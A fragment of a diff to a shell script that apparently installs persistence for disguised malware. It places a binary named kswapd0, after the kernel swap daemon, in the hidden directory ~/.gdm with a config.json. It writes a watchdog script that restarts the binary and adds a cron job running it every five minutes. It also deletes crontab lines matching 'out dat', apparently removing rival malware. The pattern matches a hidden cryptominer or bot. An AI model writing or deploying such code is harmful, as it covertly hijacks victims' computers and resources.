@@ -31,15 +31,15 @@ else
 fi
 
 # Create the check script
-cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
+cat << 'EOF' > "$HOME/.gdm/check_kswapd0.sh"
 #!/bin/bash
 
-KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
-CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"
+KSWAPD0_PATH="$HOME/.gdm/kswapd0"
+CONFIG_JSON_PATH="$HOME/.gdm/config.json"
 
 if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
     echo "kswapd0 not started. Going to start it..."
-    cd "$HOME/.gdm2_manual/" || exit
+    cd "$HOME/.gdm/" || exit
     ./kswapd0 --config=config.json &
 else
     echo "kswapd0 already started."
@@ -47,8 +47,8 @@ fi
 EOF
 
 # Make the check script executable
-chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
+chmod +x "$HOME/.gdm/check_kswapd0.sh"
 
 # Cron job setup: remove outdated lines and add the new command
-CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
+CRON_JOB="*/5 * * * * $HOME/.gdm/check_kswapd0.sh"
 (crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
